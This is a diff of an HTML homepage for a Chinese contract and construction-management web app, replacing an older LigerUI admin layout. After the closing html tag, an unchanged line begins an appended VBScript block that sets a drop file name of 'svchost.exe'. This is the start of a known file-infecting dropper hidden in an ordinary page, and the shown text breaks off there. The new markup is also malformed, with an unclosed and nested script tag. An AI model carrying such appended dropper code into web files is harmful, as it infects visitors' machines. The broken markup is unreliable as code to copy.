@@ -1,440 +1,164 @@
 ﻿<!DOCTYPE html>
 <html>
 <head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
-    <title>首页</title>
-	<meta charset="utf-8" />
-    <link href="assets/lib/ligerUI/skins/Aqua/css/ligerui-all.css" rel="stylesheet" type="text/css" />
-    <link rel="stylesheet" type="text/css" id="mylink" />
-    <script src="assets/lib/jquery/jquery-1.9.0.min.js" type="text/javascript"></script>
-    <script src="assets/lib/ligerUI/js/ligerui.all.js" type="text/javascript"></script>
-    <script src="assets/lib/jquery.cookie.js"></script>
-    <script src="assets/lib/json2.js"></script>
-    <script src="indexdata.js" type="text/javascript"></script>
-    <script type="text/javascript">
-
-            var tab = null;
-            var accordion = null;
-            var tree = null;
-            var tabItems = [];
-            $(function ()
-            {
-
-                //布局
-                $("#layout1").ligerLayout({
-                    leftWidth: 190,
-                    height: '100%',
-                    heightDiff: -34,
-                    space: 4,
-                    onHeightChanged: f_heightChanged,
-                    onLeftToggle: function ()
-                    {
-                        tab && tab.trigger('sysWidthChange');
-                    },
-                    onRightToggle: function ()
-                    {
-                        tab && tab.trigger('sysWidthChange');
-                    }
-                });
-
-                var height = $(".l-layout-center").height();
-
-                //Tab
-                tab = $("#framecenter").ligerTab({
-                    height: height,
-                    showSwitchInTab : true,
-                    showSwitch: true,
-                    onAfterAddTabItem: function (tabdata)
-                    {
-                        tabItems.push(tabdata);
-                        saveTabStatus();
-                    },
-                    onAfterRemoveTabItem: function (tabid)
-                    {
-                        for (var i = 0; i < tabItems.length; i++)
-                        {
-                            var o = tabItems[i];
-                            if (o.tabid == tabid)
-                            {
-                                tabItems.splice(i, 1);
-                                saveTabStatus();
-                                break;
-                            }
-                        }
-                    },
-                    onReload: function (tabdata)
-                    {
-                        var tabid = tabdata.tabid;
-                        addFrameSkinLink(tabid);
-                    }
-                });
-
-                //面板
-                $("#accordion1").ligerAccordion({
-                    height: height - 24, speed: null
-                });
-
-                $(".l-link").hover(function ()
-                {
-                    $(this).addClass("l-link-over");
-                }, function ()
-                {
-                    $(this).removeClass("l-link-over");
-                });
-                //树
-                $("#tree1").ligerTree({
-                    data : indexdata,
-                    checkbox: false,
-                    slide: false,
-                    nodeWidth: 120,
-                    attribute: ['nodename', 'url'],
-                    render : function(a){
-                        if (!a.isnew) return a.text;
-                        return '<a href="' + a.url + '" target="_blank">' + a.text + '</a>';
-                    },
-                    onSelect: function (node)
-                    {
-                        if (!node.data.url) return;
-                        if (node.data.isnew)
-                        {
-                            return;
-                        }
-                        var tabid = $(node.target).attr("tabid");
-                        if (!tabid)
-                        {
-                            tabid = new Date().getTime();
-                            $(node.target).attr("tabid", tabid)
-                        }
-                        f_addTab(tabid, node.data.text, node.data.url);
-                    }
-                });
-
-                function openNew(url)
-                {
-                    var jform = $('#opennew_form');
-                    if (jform.length == 0)
-                    {
-                        jform = $('<form method="post" />').attr('id', 'opennew_form').hide().appendTo('body');
-                    } else
-                    {
-                        jform.empty();
-                    }
-                    jform.attr('action', url);
-                    jform.attr('target', '_blank');
-                    jform.trigger('submit');
-                };
-
-
-                tab = liger.get("framecenter");
-                accordion = liger.get("accordion1");
-                tree = liger.get("tree1");
-                $("#pageloading").hide();
-
-                css_init();
-                pages_init();
-            });
-            function f_heightChanged(options)
-            {
-                if (tab)
-                    tab.addHeight(options.diff);
-                if (accordion && options.middleHeight - 24 > 0)
-                    accordion.setHeight(options.middleHeight - 24);
-            }
-            function f_addTab(tabid, text, url)
-            {
-                tab.addTabItem({
-                    tabid: tabid,
-                    text: text,
-                    url: url,
-                    callback: function ()
-                    {
-                        addFrameSkinLink(tabid);
-                    }
-                });
-            }       
-            function showCodeView(src)
-            {
-                $.ligerDialog.open({
-                    title : '源码预览',
-                    url: 'dotnetdemos/codeView.aspx?src=' + src,
-                    width: $(window).width() *0.9,
-                    height: $(window).height() * 0.9
-                });
-
-            }
-            function addFrameSkinLink(tabid)
-            {
-                var prevHref = getLinkPrevHref(tabid) || "";
-                var skin = getQueryString("skin");
-                if (!skin) return;
-                skin = skin.toLowerCase();
-                attachLinkToFrame(tabid, prevHref + skin_links[skin]);
-            }
-            var skin_links = {
-                "aqua": "assets/lib/ligerUI/skins/Aqua/css/ligerui-all.css",
-                "gray": "assets/lib/ligerUI/skins/Gray/css/all.css",
-                "silvery": "assets/lib/ligerUI/skins/Silvery/css/style.css",
-                "gray2014": "assets/lib/ligerUI/skins/gray2014/css/all.css"
-            };
-            function pages_init()
-            {
-                var tabJson = $.cookie('liger-home-tab');
-                if (tabJson)
-                {
-                    var tabitems = JSON2.parse(tabJson);
-                    for (var i = 0; tabitems && tabitems[i];i++)
-                    {
-                        f_addTab(tabitems[i].tabid, tabitems[i].text, tabitems[i].url);
-                    }
-                }
-            }
-            function saveTabStatus()
-            {
-                $.cookie('liger-home-tab', JSON2.stringify(tabItems));
-            }
-            function css_init()
-            {
-                var css = $("#mylink").get(0), skin = getQueryString("skin");
-                skin = skin == '' ? "gray" : skin;
-                $("#skinSelect").val(skin);
-                $("#skinSelect").change(function ()
-                {
-                    if (this.value)
-                    {
-                        location.href = "main.html?skin=" + this.value;
-                    } else
-                    {
-                        location.href = "main.html";
-                    }
-                });
-
-
-                if (!css || !skin) return;
-                skin = skin.toLowerCase();
-                $('body').addClass("body-" + skin);
-                $(css).attr("href", skin_links[skin]);
-            }
-            function getQueryString(name)
-            {
-                var now_url = document.location.search.slice(1), q_array = now_url.split('&');
-                for (var i = 0; i < q_array.length; i++)
-                {
-                    var v_array = q_array[i].split('=');
-                    if (v_array[0] == name)
-                    {
-                        return v_array[1];
-                    }
-                }
-                return false;
-            }
-            function attachLinkToFrame(iframeId, filename)
-            {
-                if(!window.frames[iframeId]) return;
-                var head = window.frames[iframeId].document.getElementsByTagName('head').item(0);
-                var fileref = window.frames[iframeId].document.createElement("link");
-                if (!fileref) return;
-                fileref.setAttribute("rel", "stylesheet");
-                fileref.setAttribute("type", "text/css");
-                fileref.setAttribute("href", filename);
-                head.appendChild(fileref);
-            }
-            function getLinkPrevHref(iframeId)
-            {
-                if (!window.frames[iframeId]) return;
-                var head = window.frames[iframeId].document.getElementsByTagName('head').item(0);
-                var links = $("link:first", head);
-                for (var i = 0; links[i]; i++)
-                {
-                    var href = $(links[i]).attr("href");
-                    if (href && href.toLowerCase().indexOf("ligerui") > 0)
-                    {
-                        return href.substring(0, href.toLowerCase().indexOf("lib") );
-                    }
-                }
-            }
-    </script> 
-    <style type="text/css">
-        body, html {
-            height: 100%;
-        }
-
-        body {
-            padding: 0px;
-            margin: 0;
-            overflow: hidden;
-        }
-
-        .l-link {
-            display: block;
-            height: 26px;
-            line-height: 26px;
-            padding-left: 10px;
-            text-decoration: underline;
-            color: #333;
-        }
-
-        .l-link2 {
-            text-decoration: underline;
-            color: white;
-            margin-left: 2px;
-            margin-right: 2px;
-        }
-
-        .l-layout-top {
-            background: #102A49;
-            color: White;
-        }
-
-        .l-layout-bottom {
-            background: #E5EDEF;
-            text-align: center;
-        }
-
-        #pageloading {
-            position: absolute;
-            left: 0px;
-            top: 0px;
-            background: white url('loading.gif') no-repeat center;
-            width: 100%;
-            height: 100%;
-            z-index: 99999;
-        }
-
-        .l-link {
-            display: block;
-            line-height: 22px;
-            height: 22px;
-            padding-left: 16px;
-            border: 1px solid white;
-            margin: 4px;
-        }
-
-        .l-link-over {
-            background: #FFEEAC;
-            border: 1px solid #DB9F00;
-        }
-
-        .l-winbar {
-            background: #2B5A76;
-            height: 30px;
-            position: absolute;
-            left: 0px;
-            bottom: 0px;
-            width: 100%;
-            z-index: 99999;
-        }
-
-        .space {
-            color: #E7E7E7;
-        }
-        /* 顶部 */
-        .l-topmenu {
-            margin: 0;
-            padding: 0;
-            height: 31px;
-            line-height: 31px;
-            background: url('assets/lib/images/top.jpg') repeat-x bottom;
-            position: relative;
-            border-top: 1px solid #1D438B;
-        }
-
-        .l-topmenu-logo {
-            color: #E7E7E7;
-            padding-left: 35px;
-            line-height: 26px;
-            background: url('lib/images/topicon.gif') no-repeat 10px 5px;
-        }
-
-        .l-topmenu-welcome {
-            position: absolute;
-            height: 24px;
-            line-height: 24px;
-            right: 30px;
-            top: 2px;
-            color: #070A0C;
-        }
-
-            .l-topmenu-welcome a {
-                color: #E7E7E7;
-                text-decoration: underline;
-            }
-
-        .body-gray2014 #framecenter {
-            margin-top: 3px;
-        }
-
-        .viewsourcelink {
-            background: #B3D9F7;
-            display: block;
-            position: absolute;
-            right: 10px;
-            top: 3px;
-            padding: 6px 4px;
-            color: #333;
-            text-decoration: underline;
-        }
-
-        .viewsourcelink-over {
-            background: #81C0F2;
-        }
-
-        .l-topmenu-welcome label {
-            color: white;
-        }
-
-        #skinSelect {
-            margin-right: 6px;
-        }
-    </style>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge" ></meta>
+	<title>我的主页</title>
+	<link rel="stylesheet" type="text/css" href="resources/css/index.css">
+	<link rel="stylesheet" type="text/css" href="resources/css/ui.css">
+	<link rel="stylesheet" type="text/css" href="resources/css/main.css"/>
+	<link rel="stylesheet" type="text/css" href="resources/css/base.css">
+	<script src="resources/js/jquery-1.7.2.min.js" type="text/javascript" ></script>
+	<script src="resources/js/config.js" type="text/javascript" ></script>
+	<script src="resources/js/cnDateFn.js" type="text/javascript">
+	<script type="text/javascript">
+		<script type="text/javascript">
+		$(document).ready(function(){
+			var greetings = "";
+			var cur_time = new Date().getHours();
+			if(cur_time >= 0 && cur_time <= 4 ) {
+				greetings = "已经夜深了，请注意休息";
+			} else if (cur_time > 4 && cur_time <= 7 ) {
+				greetings = "早上好";
+			} else if (cur_time > 7 && cur_time < 12 ) {
+				greetings = "上午好";
+			} else if (cur_time >= 12 && cur_time <= 18 ) {
+				greetings = "下午好";
+			} else {
+				greetings = "晚上好";
+			};
+			var greetObj = $("#greetings");
+			var userObj = $("#username");
+			
+			greetObj.text(greetings);
+			userObj.text(parent.SYSTEM.realName);
+			
+			$("#search").click(function(){
+				search();
+			});
+		});	
+	</script>
 </head>
-<body style="padding:0px;background:#EAEEF5;">
-    <div id="pageloading"></div>
-    <div id="topmenu" class="l-topmenu">
-        <div class="l-topmenu-logo">安质部管理系统</div>
-        <div class="l-topmenu-welcome">
-            <label> 切换皮肤：</label>
-            <select id="skinSelect">
-                <option value="aqua">默认</option>
-                <option value="silvery">银色</option>
-                <option value="gray">灰色</option>
-                <option value="gray2014">Gray2014</option>
-            </select>
-            <a href="#" class="l-link2">张三</a>
-            <!--<span class="space">|</span>
-            <a href="#" class="l-link2" target="_blank">注销</a>-->
-            <span class="space">|</span>
-            <a href="#" class="l-link2" target="_blank">退出</a>
-        </div>
-    </div>
-    <div id="layout1" style="width:99.2%; margin:0 auto; margin-top:4px; ">
-        <div position="left" title="导航栏" id="accordion1">
-            <div title="功能列表" class="l-scroll">
-                <ul id="tree1" style="margin-top:3px;">
-            </div>
-            <div title="系统设置">
-                <div style=" height:7px;"></div>
-                <a class="l-link" href="http://www.ligerui.com/go.aspx?id=case" target="_blank">演示系统</a>
-                <a class="l-link" href="javascript:f_addTab('listpage','列表页面','demos/case/listpage.htm')">列表页面</a>
-                <a class="l-link" href="demos/dialog/win7.htm" target="_blank">模拟Window桌面</a>
-                <a class="l-link" href="javascript:f_addTab('week','工作日志','demos/case/week.htm')">工作日志</a>
-            </div>
-            <div title="没有定义的模块">
-                <div style=" height:7px;"></div>
-                <a class="l-link" href="lab/generate/index.htm" target="_blank">表格表单设计器</a>
-                <a class="l-link" href="lab/formdesign/index.htm" target="_blank">可视化表单设计</a>
-            </div>
-        </div>
-        <div position="center" id="framecenter">
-            <div tabid="home" title="我的主页" style="height:300px">
-                <iframe frameborder="0" name="home" id="home" src="welcome.htm"></iframe>
-            </div>
-        </div>
-
-    </div>
-    <div style="height:32px; line-height:32px; text-align:center;">
-        Copyright © 2011-2014 http://n-bers.com
-    </div>
-    <div style="display:none"></div>
+<body>
+	<div id="hd" class="hd">
+		<p class="alt-today font_13">
+			 <img alt="" src="${path}/resources/images/icn_date.gif" width="14" height="16" />
+             <span>
+                 <script type="text/javascript">
+                     RunGLNL();
+                 </script>
+             </span>
+		</p>
+		<p class="ht_10"></p>
+	  	<p class="welcome">
+	  		<img alt="" src="${path}/resources/images/icn_user_gray.png" width="14" height="16" />
+		  	<strong><span id="greetings">您好</span>，<span id="username">管理员</span>！</strong>
+		  	维护<a data-tabid="khlb" data-tabTxt="客户列表" data-parentOpen="true" rel="pageTab"  href="${path}/customer/toList">「客户」、</a>
+		  	<a data-tabid="dwlb" data-tabTxt="单位列表" data-parentOpen="true" rel="pageTab" href="${path}/company/toList">「施工单位」</a>信息。
+		  	
+	  	</p>
+	</div>
+	<div id="bd" class="clearfix" >
+		<div class="col-main">
+		    <div class="main-wrap cf">
+		      <div class="m-top">
+		      	 <form onsubmit="return search();" method="post">
+			      	 <div class="storages-search">
+			      	 <label for="">合同名称:</label>
+			      	 <span class="ui-search"><input type="text" name="contractName" id="contractName" class="ui-input" /></span>
+			      	 <input type="submit" class="ui-btn" value="查 询" /></div>
+		      	</form>
+		      </div>
+		      <ul class="quick-links">
+		        <li class="contract-huiqian">
+		        	<a data-tabid="" data-tabTxt="公建总包新建" data-parentOpen="true" rel="pageTab" href="${path}/contract/add?moduleType=1">
+		        		<span></span>公建总包新建
+	        		</a>
+		        </li>
+		        <li class="division-edit">
+		        	<a data-tabid="" data-tabTxt="住建总包新建" data-parentOpen="true" rel="pageTab" href="${path}/contract/add?moduleType=2">
+		        		<span></span>住建总包新建
+	        		</a>
+		        </li>
+		        <li class="fund-transfers">
+		        	<a data-tabid=""  data-tabTxt="公建分包新建" data-parentOpen="true" rel="pageTab" href="${path}/contract/subAdd?moduleType=1">
+		        		<span></span>公建分包新建
+		        	</a>
+		        </li>
+		        <li class="statistics-funds">
+		        	<a data-tabid="" data-tabTxt="住建分包新建" data-parentOpen="true" rel="pageTab" href="${path}/contract/subAdd?moduleType=2">
+		        		<span></span>住建分包新建
+		        	</a>
+		        </li>
+		        <li class="customer-list">
+		        	<a data-tabid="" data-tabTxt="施工单新建" data-parentOpen="true" rel="pageTab" href="${path}/gongdan/add">
+		        		<span></span>施工单新建
+		        	</a>
+		        </li>
+		        <li class="manufacturer-list">
+		        	<a data-tabid="" data-tabTxt="施工进度" data-parentOpen="true" rel="pageTab" href="${path }/process/add">
+		        		<span></span>施工进度
+		        	</a>
+		        </li>
+		        <li class="user_list">
+		        	<a data-tabid="" data-tabTxt="资金收款" data-parentOpen="true" rel="pageTab" href="${path}/fund/receipt/add">
+		        		<span></span>资金收款
+		        	</a>
+		        </li>
+		        <li class="feedback">
+		        	<a data-tabid="" data-tabTxt="资金付款计划" data-parentOpen="true" rel="pageTab" href="${path}/fund/pay/add"><span></span>资金付款计划</a>
+		        </li>
+		      </ul>
+		    </div>
+		</div>
+		<div class="col-extra">
+		  <div class="extra-wrap">
+		    <h2>快速查看</h2>
+		    <div class="list">
+		      <ul>
+		      	<li>
+		      		<a rel="pageTab" data-tabid="httj" data-tabTxt="合同统计" data-parentOpen="true">查看合同统计</a>
+		      	</li>
+		        <li>
+		        	<a rel="pageTab" data-tabid="sfkcx" data-tabTxt="收付款查询" data-parentOpen="true">查看资金收付情况</a>
+		        </li>
+		      	<li>
+		      		<a rel="pageTab" data-tabid="sgdlb" data-tabTxt="施工单列表" data-parentOpen="true">查看施工单列表</a>
+		      	</li>
+		      	<li>
+		      		<a rel="pageTab" data-tabid="bzgctj" data-tabTxt="报装工程统计" data-parentOpen="true" >查看报装工程统计</a>
+		      	</li>
+		      	<li>
+		      		<a rel="pageTab" data-tabid="fbdwtj" data-tabTxt="分包单位统计" data-parentOpen="true">查看分包单位统计</a>
+		      	</li>
+		        <li>
+		        	<a rel="pageTab" data-tabid="rwdjtz" data-tabTxt="任务登记台账" data-parentOpen="true">查看任务登记台账</a>
+		       	</li>
+		        <li>
+		        	<a rel="pageTab" data-tabid="gcxmqd" data-tabTxt="工程项目清单" data-parentOpen="true" >查看工程项目清单</a>
+		        </li>
+		        <li>
+		        	<a rel="pageTab" data-tabid="xmyytj" data-tabTxt="项目盈余统计" data-parentOpen="true" >查看项目盈余统计</a>
+		        </li>
+		        <li>
+		        	<a rel="pageTab" data-tabid="qkyytj" data-tabTxt="切块盈余统计" data-parentOpen="true" >查看切块盈余统计</a>
+		        </li>
+		      </ul>
+		    </div>
+		  </div>
+		</div>
+	</div>
+	<script type="text/javascript">
+		Public.pageTab();	
+		function search(){
+			var name= $("#contractName").val();
+			if(parent.tab.isTabItemExist('htzhcx')){
+				parent.tab.removeTabItem('htzhcx');
+			}
+			parent.Public.addTab('htzhcx',"合同信息综合查询","${path}/report/toContractQuery?contractName="+name);
+			return false;
+		}
+	</script>
 </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
